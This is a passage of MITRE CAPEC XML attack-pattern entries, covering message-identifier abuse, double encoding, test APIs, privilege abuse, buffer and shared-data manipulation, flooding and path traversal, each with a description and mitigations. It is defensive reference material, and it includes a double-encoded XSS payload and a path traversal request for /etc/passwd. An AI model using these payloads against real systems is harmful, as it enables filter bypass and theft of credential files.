         <Description>An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Prerequisites>
            <Prerequisite>The target must transmit data over a medium that is accessible to the adversary.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The adversary must have the necessary technology to intercept information passing between the nodes of a network. For TCP/IP, the capability to run tcpdump, ethereal, etc. can be useful. Depending upon the data being targeted the technological requirements will change.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="300"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description Summary, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="12" Name="Choosing Message Identifier" Abstraction="Standard" Status="Draft">
         <Description>This pattern of attack is defined by the selection of messages distributed over via multicast or public information channels that are intended for another client by determining the parameter value assigned to that client. This attack allows the adversary to gain access to potentially privileged information, and to possibly perpetrate other attacks through the distribution means by impersonation. If the channel/message being manipulated is an input rather than output mechanism for the system, (such as a command bus), this style of attack could be used to change the adversary's identifier to more a privileged one.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="PeerOf" CAPEC_ID="21"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="216"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>Determine the nature of messages being transported as well as the identifiers to be used as part of the attack</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>If required, authenticate to the distribution channel</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>If any particular client's information is available through the transport means simply by selecting a particular identifier, an attacker can simply provide that particular identifier.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Experiment</Phase>
               <Description>Attackers with client access connecting to output channels could change their channel identifier and see someone else's (perhaps more privileged) data.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Information and client-sensitive (and client-specific) data must be present through a distribution channel available to all users.</Prerequisite>
            <Prerequisite>Distribution means must code (through channel, message identifiers, or convention) message destination in a manner visible within the distribution means itself (such as a control channel) or in the messages themselves.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">All the attacker needs to discover is the format of the messages on the channel/distribution means and the particular identifier used within the messages.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>The Attacker needs the ability to control source code or application configuration responsible for selecting which message/channel id is absorbed from the public distribution means.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>
               <xhtml:p>Associate some ACL (in the form of a token) with an authenticated user which they provide middleware. The middleware uses this token as part of its channel/message selection for that client, or part of a discerning authorization decision for privileged channels/messages.</xhtml:p>
               <xhtml:p>The purpose is to architect the system in a way that associates proper authentication/authorization with each channel/message.</xhtml:p>
            </Mitigation>
            <Mitigation>Re-architect system input/output channels as appropriate to distribute self-protecting data. That is, encrypt (or otherwise protect) channels/messages so that only authorized readers can see them.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>A certain B2B interface on a large application codes for messages passed over an MQSeries queue, on a single "Partners" channel. Messages on that channel code for their client destination based on a partner_ID field, held by each message. That field is a simple integer. Attackers having access to that channel, perhaps a particularly nosey partner, can simply choose to store messages of another partner's ID and read them as they desire. Note that authentication does not prevent a partner from leveraging this attack on other partners. It simply disallows Attackers without partner status from conducting this attack.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="201"/>
            <Related_Weakness CWE_ID="306"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-12-07">Choosing a Message/Channel Identifier on a Public/Multicast Channel</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="120" Name="Double Encoding" Abstraction="Detailed" Status="Draft">
         <Description>The adversary utilizes a repeating of the encoding process for a set of characters (that is, character encoding a character encoding of a character) to obfuscate the payload of a particular request. This may allow the adversary to bypass filters that attempt to detect illegal characters or strings, such as those that might be used in traversal or injection attacks. Filters may be able to catch illegal encoded strings, but may not catch doubly encoded strings. For example, a dot (.), often used in path traversal attacks and therefore often blocked by filters, could be URL encoded as %2E. However, many filters recognize this encoding and would still block the request. In a double encoding, the % in the above URL encoding would be encoded again as %25, resulting in %252E which some filters might not catch, but which could still be interpreted as a dot (.) by interpreters on the target.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="267"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an attacker records all entry points to the application.</Description>
               <Technique>Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.</Technique>
               <Technique>Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.</Technique>
               <Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</Technique>
               <Technique>Manually inspect the application to find entry points.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Probe entry points to locate vulnerabilities] Try double-encoding for parts of the input in order to try to get past the filters. For instance, by double encoding certain characters in the URL (e.g. dots and slashes) an adversary may try to get access to restricted resources on the web server or force browse to protected pages (thus subverting the authorization service). An adversary can also attempt other injection style attacks using this attack pattern: command injection, SQL injection, etc.</Description>
               <Technique>Try to use double-encoding to bypass validation routines.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The target's filters must fail to detect that a character has been doubly encoded but its interpreting engine must still be able to convert a doubly encoded character to an un-encoded character.</Prerequisite>
            <Prerequisite>The application accepts and decodes URL string request.</Prerequisite>
            <Prerequisite>The application performs insufficient filtering/canonicalization on the URLs.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>Tools that automate encoding of data can assist the adversary in generating encoded strings.</Resource>
         </Resources_Required>
         <Mitigations>
            <Mitigation>Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input.</Mitigation>
            <Mitigation>Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding.</Mitigation>
            <Mitigation>When client input is required from web-based forms, avoid using the "GET" method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the "POST method whenever possible.</Mitigation>
            <Mitigation>Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.</Mitigation>
            <Mitigation>Refer to the RFCs to safely decode URL.</Mitigation>
            <Mitigation>Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive.</Mitigation>
            <Mitigation>There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>Double Enconding Attacks can often be used to bypass Cross Site Scripting (XSS) detection and execute XSS attacks.:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="attack">%253Cscript%253Ealert('This is an XSS Attack')%253C%252Fscript%253E</xhtml:div>
               <xhtml:p>Since &lt;, &lt;, and / are often sued to perform web attacks, these may be captured by XSS filters. The use of double encouding prevents the filter from working as intended and allows the XSS to bypass dectection. This can allow an adversary to execute malicious code.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="173"/>
            <Related_Weakness CWE_ID="172"/>
            <Related_Weakness CWE_ID="177"/>
            <Related_Weakness CWE_ID="181"/>
            <Related_Weakness CWE_ID="171"/>
            <Related_Weakness CWE_ID="183"/>
            <Related_Weakness CWE_ID="184"/>
            <Related_Weakness CWE_ID="21"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="697"/>
            <Related_Weakness CWE_ID="692"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Description Summary, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="121" Name="Exploit Test APIs" Abstraction="Standard" Status="Draft">
         <Description>An attacker exploits a sample, demonstration, or test API that is insecure by default and should not be resident on production systems. Some applications include APIs that are intended to allow an administrator to test and refine their domain. These APIs should usually be disabled once a system enters a production environment. Testing APIs may expose a great deal of diagnostic information intended to aid an administrator, but which can also be used by an attacker to further refine their attack. Moreover, testing APIs may not have adequate security controls or may not have undergone rigorous testing since they were not intended for use in production environments. As such, they may have many flaws and vulnerabilities that would allow an attacker to severely disrupt a target.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="113"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Determine Vulnerable API] An adversary explores a target system for sample or test APIs that have not been disabled by a system administrator and which may be exploitable by the adversary.</Description>
               <Technique>If needed, the adversary explores an organization's network to determine if any specific systems of interest exist.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Exploit</Phase>
               <Description>[Leverage Test API to Execute Attacks] Once an adversary has discovered a system with a sample or test API, the API is leveraged to exploit the system and/or conduct various attacks.</Description>
               <Technique>The adversary can leverage the sample or test API to conduct several types of attacks such as Man-in-the-Middle attacks, keylogging, Cross Site Scripting (XSS), and more.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The target must have installed test APIs and failed to secure or remove them when brought into a production environment.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>For some APIs, the attacker will need that appropriate client application that interfaces with the API. Other APIs can be executed using simple tools, such as web browsers or console windows. In some cases, an attacker may need to be able to authenticate to the target before it can access the vulnerable APIs.</Resource>
         </Resources_Required>
         <Mitigations>
            <Mitigation>Ensure that production systems to not contain sample or test APIs and that these APIs are only used in development environments.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="489"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Attack_Phases, Description, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-12-07">Locate and Exploit Test APIs</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="122" Name="Privilege Abuse" Abstraction="Meta" Status="Draft">
         <Description>An adversary is able to exploit features of the target that should be reserved for privileged users or administrators but are exposed to use by lower or non-privileged accounts. Access to sensitive information and functionality must be controlled to ensure that only authorized users are able to access these resources. If access control mechanisms are absent or misconfigured, a user may be able to access resources that are intended only for higher level users. An adversary may be able to exploit this to utilize a less trusted account to gain information and perform activities reserved for more trusted accounts. This attack differs from privilege escalation and other privilege stealing attacks in that the adversary never actually escalates their privileges but instead is able to use a lesser degree of privilege to access resources that should be (but are not) reserved for higher privilege accounts. Likewise, the adversary does not exploit trust or subvert systems - all control functionality is working as configured but the configuration does not adequately protect sensitive resources at an appropriate level.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Prerequisites>
            <Prerequisite>The target must have misconfigured their access control mechanisms such that sensitive information, which should only be accessible to more trusted users, remains accessible to less trusted users.</Prerequisite>
            <Prerequisite>The adversary must have access to the target, albeit with an account that is less privileged than would be appropriate for the targeted resources.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack. The ability to access the target is required.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="732"/>
            <Related_Weakness CWE_ID="269"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="123" Name="Buffer Manipulation" Abstraction="Meta" Status="Draft">
         <Description>An adversary manipulates an application's interaction with a buffer in an attempt to read or modify data they shouldn't have access to. Buffer attacks are distinguished in that it is the buffer space itself that is the target of the attack rather than any code responsible for interpreting the content of the buffer. In virtually all buffer attacks the content that is placed in the buffer is immaterial. Instead, most buffer attacks involve retrieving or providing more input than can be stored in the allocated buffer, resulting in the reading or overwriting of other unintended program memory.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Prerequisites>
            <Prerequisite>The adversary must identify a programmatic means for interacting with a buffer, such as vulnerable C code, and be able to provide input to this interaction.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
               <Note>A buffer manipulation attack often results in a crash of the application due to the corruption of memory.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Impact>Modify Data</Impact>
               <Impact>Read Data</Impact>
               <Note>If constructed properly, a buffer manipulation attack can be used to contol the execution of the application leading to any number of negative consequenses.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>To help protect an application from buffer manipulation attacks, a number of potential mitigations can be leveraged. Before starting the development of the application, consider using a code language (e.g., Java) or compiler that limits the ability of developers to act beyond the bounds of a buffer. If the chosen language is susceptible to buffer related issues (e.g., C) then consider using secure functions instead of those vulnerable to buffer manipulations. If a potentially dangerous function must be used, make sure that proper boundary checking is performed. Additionally, there are often a number of compiler-based mechanisms (e.g., StackGuard, ProPolice and the Microsoft Visual Studio /GS flag) that can help identify and protect against potential buffer issues. Finally, there may be operating system level preventative functionality that can be applied.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="119"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Attack_Motivation-Consequences, Injection_Vector, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Solutions_and_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="124" Name="Shared Data Manipulation" Abstraction="Meta" Status="Draft">
         <Description>An adversary exploits a data structure shared between multiple applications or an application pool to affect application behavior. Data may be shared between multiple applications or between multiple threads of a single application. Data sharing is usually accomplished through mutual access to a single memory location. If an adversary can manipulate this shared data (usually by co-opting one of the applications or threads) the other applications or threads using the shared data will often continue to trust the validity of the compromised shared data and use it in their calculations. This can result in invalid trust assumptions, corruption of additional data through the normal operations of the other users of the shared data, or even cause a crash or compromise of the sharing applications.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Prerequisites>
            <Prerequisite>The target applications (or target application threads) must share data between themselves.</Prerequisite>
            <Prerequisite>The adversary must be able to manipulate some piece of the shared data either directly or indirectly and the other users of the data must accept the changed data as valid. Usually this requires that the adversary be able to compromise one of the sharing applications or threads in order to manipulate the shared data.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Description Summary, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description Summary, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-01-09">Attack through Shared Data</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="125" Name="Flooding" Abstraction="Meta" Status="Stable">
         <Description>An adversary consumes the resources of a target by rapidly engaging in a large number of interactions with the target. This type of attack generally exposes a weakness in rate limiting or flow. When successful this attack prevents legitimate users from accessing the service and can cause the target to crash. This attack differs from resource depletion through leaks or allocations in that the latter attacks do not rely on the volume of requests made to the target but instead focus on manipulation of the target's operations. The key factor in a flooding attack is the number of requests the adversary can make in a given period of time. The greater this number, the more likely an attack is to succeed against a given target.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Prerequisites>
            <Prerequisite>Any target that services requests is vulnerable to this attack on some level of scale.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A script or program capable of generating more requests than the target can handle, or a network or cluster of objects all capable of making simultaneous requests.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
               <Impact>Resource Consumption</Impact>
               <Note>A successful flooding attack compromises the availability of the target system's service by exhausting its available resources.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Ensure that protocols have specific limits of scale configured.</Mitigation>
            <Mitigation>Specify expectations for capabilities and dictate which behaviors are acceptable when resource allocation reaches limits.</Mitigation>
            <Mitigation>Uniformly throttle all requests in order to make it more difficult to consume resources more quickly than they can again be freed.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="404"/>
            <Related_Weakness CWE_ID="770"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Attack_Motivation-Consequences, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="126" Name="Path Traversal" Abstraction="Standard" Status="Draft">
         <Description>An adversary uses path manipulation methods to exploit insufficient input validation of a target to obtain access to data that should be not be retrievable by ordinary well-formed requests. A typical variety of this attack involves specifying a path to a desired file together with dot-dot-slash characters, resulting in the file access API or function traversing out of the intended directory structure and into the root file system. By replacing or modifying the expected path information the access function or API retrieves the file desired by the attacker. These attacks either involve the attacker providing a complete path to a targeted file or using control characters (e.g. path separators (/ or \) and/or dots (.)) to reach desired directories or files.</Description>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Directory Traversal</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="153"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The attacker must be able to control the path that is requested of the target.</Prerequisite>
            <Prerequisite>The target must fail to adequately sanitize incoming paths</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Simple command line attacks or to inject the malicious payload in a web page.</Skill>
            <Skill Level="Medium">Customizing attacks to bypass non trivial filters in the application.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>The ability to manually manipulate path information either directly through a client application relative to the service or application or via a proxy application.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>The attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
               <Note>The attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Note>The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
               <Note>The attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the software from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the software.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Configure the access control correctly.</Mitigation>
            <Mitigation>Design: Enforce principle of least privilege.</Mitigation>
            <Mitigation>Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution.</Mitigation>
            <Mitigation>Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement.</Mitigation>
            <Mitigation>Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host.</Mitigation>
            <Mitigation>Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.</Mitigation>
            <Mitigation>Implementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin.</Mitigation>
            <Mitigation>Implementation: Perform input validation for all remote content, including remote and user-generated content.</Mitigation>
            <Mitigation>Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.</Mitigation>
            <Mitigation>Implementation: Use indirect references rather than actual file names.</Mitigation>
            <Mitigation>Implementation: Use possible permissions on file access when developing and deploying web applications.</Mitigation>
            <Mitigation>Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- whitelisting approach.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>An example of using path traversal to attack some set of resources on a web server is to use a standard HTTP request</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">http://example/../../../../../etc/passwd</xhtml:div>
               <xhtml:p>From an attacker point of view, this may be sufficient to gain access to the password file on a poorly protected system. If the attacker can list directories of critical resources then read only access is not sufficient to protect the system.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="22"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
            <Reference External_Reference_ID="REF-8" Section="Path Traversal"/>
            <Reference External_Reference_ID="REF-9" Section="Testing for Path Traversal (OWASP-AZ-001)"/>
            <Reference External_Reference_ID="REF-10" Section="WASC-33 - Path Traversal"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
